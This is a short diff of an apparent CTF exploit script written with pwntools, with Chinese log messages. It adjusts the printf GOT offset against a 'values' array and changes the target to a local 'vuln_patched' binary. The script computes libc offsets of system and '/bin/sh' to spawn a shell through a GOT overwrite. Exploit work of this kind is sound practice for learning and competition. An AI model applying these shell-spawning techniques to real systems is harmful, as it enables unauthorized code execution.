@@ -5,7 +5,7 @@ context(log_level="debug", arch="amd64")
 
 libc = ELF("./libc.so.6")
 
-offset_printf_got = 0x8EF8 - 0x9300  # printf@GOT - &values[0]
+offset_printf_got = 0x8F10 - 0x9300  # printf@GOT - &values[0]
 offset_system = libc.symbols["system"] - libc.symbols["printf"]
 offset_binsh = next(libc.search(b"/bin/sh\x00")) - libc.symbols["printf"]
 
@@ -20,7 +20,9 @@ while True:
     log.info(f"尝试第 {attempt} 次...")
 
     try:
-        io = process("./SSA-Revenge", level="info")
+        io = process("./vuln_patched")
+        # io = remote("localhost", 9999)
+        context.log_level = "info"
 
         # 首块必须为 entry 块
         cmd(io, "label entry")
